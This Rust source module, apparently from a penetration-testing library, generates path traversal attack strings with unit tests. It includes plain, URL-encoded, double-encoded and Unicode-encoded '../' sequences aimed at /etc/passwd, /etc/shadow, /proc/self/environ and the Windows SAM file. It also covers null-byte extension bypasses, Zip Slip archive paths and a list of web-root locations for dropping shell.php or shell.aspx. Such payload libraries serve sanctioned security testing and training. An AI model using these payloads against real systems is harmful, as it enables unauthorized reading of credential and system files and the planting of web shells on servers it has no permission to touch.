//! Path traversal payloads

/// Path traversal payload
#[derive(Debug, Clone)]
pub struct TraversalPayload {
    pub name: String,
    pub payload: String,
}

impl TraversalPayload {
    pub fn new(name: &str, payload: &str) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
        }
    }
}

/// Basic traversal patterns
pub fn basic_payloads() -> Vec<TraversalPayload> {
    vec![
        TraversalPayload::new("Basic ../", "../../../etc/passwd"),
        TraversalPayload::new("URL encoded", "..%2F..%2F..%2Fetc%2Fpasswd"),
        TraversalPayload::new("Double URL encoded", "..%252F..%252F..%252Fetc%252Fpasswd"),
        TraversalPayload::new("Null byte", "../../../etc/passwd%00"),
        TraversalPayload::new("Backslash", "..\\..\\..\\etc\\passwd"),
    ]
}

/// Generate traversal payload for target file
pub fn for_file(target: &str, depth: usize) -> String {
    format!("{}{}", "../".repeat(depth), target)
}

/// Windows path targets
pub fn windows_targets() -> Vec<&'static str> {
    vec![
        "windows/system32/config/sam",
        "windows/win.ini",
        "windows/system.ini",
        "boot.ini",
    ]
}

/// Linux path targets
pub fn linux_targets() -> Vec<&'static str> {
    vec![
        "etc/passwd",
        "etc/shadow",
        "etc/hosts",
        "proc/self/environ",
        "var/log/apache2/access.log",
    ]
}

/// Generate Unix-style traversal payloads for a target file
pub fn unix_traversal_payloads(target: &str, max_depth: usize) -> Vec<String> {
    let target = target.trim_start_matches('/');
    let mut payloads = Vec::new();

    for depth in 1..=max_depth {
        // Basic traversal
        payloads.push(format!("{}{}", "../".repeat(depth), target));
        // With leading slash
        payloads.push(format!("/{}{}", "../".repeat(depth), target));
        // Absolute path
        if depth == 1 {
            payloads.push(format!("/{}", target));
        }
    }

    payloads
}

/// Generate Windows-style traversal payloads for a target file
pub fn windows_traversal_payloads(target: &str, max_depth: usize) -> Vec<String> {
    let target = target.trim_start_matches('/').trim_start_matches('\\');
    let mut payloads = Vec::new();

    for depth in 1..=max_depth {
        // Backslash
        payloads.push(format!("{}{}", "..\\".repeat(depth), target));
        // Mixed
        payloads.push(format!(
            "{}{}",
            "../".repeat(depth),
            target.replace('/', "\\")
        ));
        // With drive letter
        if depth == 1 {
            payloads.push(format!("C:\\{}", target.replace('/', "\\")));
        }
    }

    payloads
}

/// Generate encoded traversal payloads
pub fn encoded_traversal_payloads(target: &str, max_depth: usize) -> Vec<String> {
    let target = target.trim_start_matches('/');
    let mut payloads = Vec::new();

    for depth in 1..=max_depth {
        // URL encoded
        payloads.push(format!(
            "{}{}",
            "..%2F".repeat(depth),
            target.replace('/', "%2F")
        ));
        // Double URL encoded
        payloads.push(format!(
            "{}{}",
            "..%252F".repeat(depth),
            target.replace('/', "%252F")
        ));
        // Unicode encoded
        payloads.push(format!("{}{}", "..%c0%af".repeat(depth), target));
        payloads.push(format!("{}{}", "..%c1%9c".repeat(depth), target));
        // Null byte
        payloads.push(format!("{}{}%00", "../".repeat(depth), target));
        payloads.push(format!("{}{}\x00", "../".repeat(depth), target));
        // Dot encoding
        payloads.push(format!("{}{}", ".%2e/".repeat(depth), target));
        payloads.push(format!("{}{}", "%2e%2e/".repeat(depth), target));
        payloads.push(format!("{}{}", "%2e%2e%2f".repeat(depth), target));
    }

    payloads
}

/// Generate traversal payloads for common sensitive files
pub fn common_file_traversals(max_depth: usize) -> Vec<String> {
    let targets = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
    ];

    let mut payloads = Vec::new();
    for target in targets {
        payloads.extend(unix_traversal_payloads(target, max_depth));
    }
    payloads
}

// =============================================================================
// Null Byte Injection
// =============================================================================

/// Double-encoded null byte (%2500)
///
/// This is URL-encoded version of %00, which bypasses filters that
/// decode only once. Used in Juice Shop's poison null byte challenge.
///
/// # Example
/// ```
/// use rectitude::payloads::traversal::double_encoded_null_byte;
/// assert_eq!(double_encoded_null_byte(), "%2500");
/// ```
pub const fn double_encoded_null_byte() -> &'static str {
    "%2500"
}

/// Triple-encoded null byte (%252500)
pub const fn triple_encoded_null_byte() -> &'static str {
    "%252500"
}

/// Generate null byte extension bypass payloads
///
/// Attempts to access a file by appending a null byte before a fake extension.
/// Many file access checks validate the extension after null byte is stripped.
///
/// # Example
/// ```
/// use rectitude::payloads::traversal::null_byte_extension_bypass;
/// let payloads = null_byte_extension_bypass("package.json.bak", "md");
/// assert!(payloads.iter().any(|p| p.contains("%2500")));
/// ```
pub fn null_byte_extension_bypass(file: &str, fake_ext: &str) -> Vec<String> {
    vec![
        // URL-encoded null byte
        format!("{file}%00.{fake_ext}"),
        // Double URL-encoded null byte (common bypass)
        format!("{file}%2500.{fake_ext}"),
        // Triple URL-encoded null byte
        format!("{file}%252500.{fake_ext}"),
        // Raw null byte (for binary protocols)
        format!("{file}\x00.{fake_ext}"),
        // Unicode null
        format!("{file}\u{0000}.{fake_ext}"),
    ]
}

/// Generate file disclosure payloads with various null byte techniques
///
/// Combines path traversal with null byte injection for accessing
/// files with extension restrictions.
pub fn null_byte_disclosure_payloads(
    target_file: &str,
    allowed_ext: &str,
    depth: usize,
) -> Vec<String> {
    let traversal = "../".repeat(depth);
    let file = target_file.trim_start_matches('/');

    vec![
        // Basic traversal + null byte + fake extension
        format!("{traversal}{file}%00.{allowed_ext}"),
        format!("{traversal}{file}%2500.{allowed_ext}"),
        format!("{traversal}{file}%252500.{allowed_ext}"),
        // URL-encoded traversal + null byte
        format!("..%2F{file}%00.{allowed_ext}"),
        format!("..%2F{file}%2500.{allowed_ext}"),
        // Double-encoded traversal + null byte
        format!("..%252F{file}%2500.{allowed_ext}"),
        // Mixed encoding
        format!("{traversal}{file}%00%2E{allowed_ext}"),
        format!("{traversal}{file}%2500%2E{allowed_ext}"),
    ]
}

// =============================================================================
// Zip Slip / Archive Traversal
// =============================================================================

/// Generate Zip Slip payload paths
///
/// Creates paths that would escape archive extraction directories.
///
/// # Example
/// ```
/// use rectitude::payloads::traversal::zip_slip_paths;
/// let paths = zip_slip_paths("evil.txt", 3);
/// assert!(paths.iter().any(|p| p.starts_with("../")));
/// ```
pub fn zip_slip_paths(target_filename: &str, max_depth: usize) -> Vec<String> {
    let mut paths = Vec::new();

    for depth in 1..=max_depth {
        // Unix-style
        paths.push(format!("{}{}", "../".repeat(depth), target_filename));
        // Windows-style
        paths.push(format!("{}{}", "..\\".repeat(depth), target_filename));
        // URL-encoded
        paths.push(format!("{}{}", "..%2F".repeat(depth), target_filename));
        // Absolute path escape
        paths.push(format!("/{}{}", "../".repeat(depth), target_filename));
    }

    // Specific target locations
    paths.extend([
        format!("../../../etc/{}", target_filename),
        format!("../../../tmp/{}", target_filename),
        format!("../../../var/www/html/{}", target_filename),
        format!("..\\..\\..\\Windows\\Temp\\{}", target_filename),
    ]);

    paths
}

/// Common web shell paths for Zip Slip attacks
pub fn zip_slip_webshell_paths() -> Vec<String> {
    vec![
        "../../../var/www/html/shell.php".to_string(),
        "../../../var/www/html/uploads/shell.php".to_string(),
        "../../../srv/www/htdocs/shell.php".to_string(),
        "../../../home/www/shell.php".to_string(),
        "../../../usr/share/nginx/html/shell.php".to_string(),
        "..\\..\\..\\inetpub\\wwwroot\\shell.aspx".to_string(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_for_file() {
        let payload = for_file("etc/passwd", 5);
        assert!(payload.starts_with("../"));
        assert!(payload.ends_with("etc/passwd"));
    }

    #[test]
    fn test_unix_traversal_payloads() {
        let payloads = unix_traversal_payloads("/etc/passwd", 3);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("../")));
    }

    #[test]
    fn test_windows_traversal_payloads() {
        let payloads = windows_traversal_payloads("windows/win.ini", 3);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("..\\")));
    }

    #[test]
    fn test_encoded_traversal_payloads() {
        let payloads = encoded_traversal_payloads("/etc/passwd", 2);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("%2F")));
    }

    #[test]
    fn test_double_encoded_null_byte() {
        assert_eq!(double_encoded_null_byte(), "%2500");
        assert_eq!(triple_encoded_null_byte(), "%252500");
    }

    #[test]
    fn test_null_byte_extension_bypass() {
        let payloads = null_byte_extension_bypass("package.json.bak", "md");
        assert!(payloads.len() >= 4);
        assert!(payloads.iter().any(|p| p.contains("%00")));
        assert!(payloads.iter().any(|p| p.contains("%2500")));
        assert!(payloads.iter().any(|p| p.contains("%252500")));
    }

    #[test]
    fn test_null_byte_disclosure_payloads() {
        let payloads = null_byte_disclosure_payloads("etc/passwd", "txt", 3);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("../")));
        assert!(payloads.iter().any(|p| p.contains("%2500")));
    }

    #[test]
    fn test_zip_slip_paths() {
        let paths = zip_slip_paths("evil.txt", 3);
        assert!(!paths.is_empty());
        assert!(paths.iter().any(|p| p.starts_with("../")));
        assert!(paths.iter().any(|p| p.starts_with("..\\")));
    }

    #[test]
    fn test_zip_slip_webshell_paths() {
        let paths = zip_slip_webshell_paths();
        assert!(!paths.is_empty());
        // All paths should contain traversal sequences (either Unix ../ or Windows ..\)
        assert!(
            paths
                .iter()
                .all(|p| p.contains("../") || p.contains("..\\"))
        );
    }
}
